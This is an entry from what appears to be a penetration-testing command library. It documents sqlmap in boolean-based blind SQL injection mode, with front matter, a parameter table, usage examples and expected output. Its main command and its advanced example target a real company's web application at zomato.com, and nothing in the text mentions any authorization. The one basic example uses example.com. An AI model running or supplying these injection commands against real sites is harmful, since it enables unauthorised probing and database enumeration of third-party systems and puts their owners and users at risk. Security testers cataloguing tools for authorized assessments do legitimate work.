---
id: cmd-sqlmap-boolean-001
data: >-
  sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dbms=mysql
  --batch --threads=1
tags:
  - sqli
  - boolean
  - automation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.071Z'
verified: false
validated: true
submitted: true
---
# sqlmap-boolean-mode

## Command

```bash
sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dbms=mysql --batch --threads=1
```

## Description

Executes sqlmap in boolean-based blind SQL injection mode to detect and confirm vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL | Yes |
| --technique=B | Boolean-based technique | Yes |
| --dbms | Database type (e.g., mysql) | No |
| --batch | Non-interactive | No |
| --threads | Parallel requests | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://example.com?id=1" --technique=B --batch
```

### Advanced Usage

```bash
sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dbms=mysql --string="success marker"
```

## Expected Output

Boolean injection confirmation and basic enumeration, e.g., "boolean-based blind works."

## Related

- [[Related Procedure: Craft-Boolean-SQL-Payloads]]
